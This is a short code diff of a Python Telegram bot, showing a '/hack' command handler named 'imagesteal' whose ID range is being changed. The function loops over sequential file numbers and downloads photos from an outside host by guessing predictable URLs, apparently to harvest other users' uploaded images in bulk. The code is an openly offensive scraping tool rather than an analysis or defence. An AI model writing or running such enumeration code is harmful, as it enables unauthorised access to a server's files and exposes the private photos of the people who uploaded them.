@@ -93,9 +93,9 @@ def todbsendtext (replied,message):
 			
 @bot.message_handler(commands=['hack'])
 def imagesteal(message):
-	a = 1104468
-	b = 1103426
-	while a > 0:
+	a = 1108408
+	b = 1104784
+	while a > b:
 		path = str("file_"+str(a)+".jpg")
 		try:
 			url = str("http://xn--m38h.ml/tgFile/?l=photos/file_"+str(a)+".jpg")
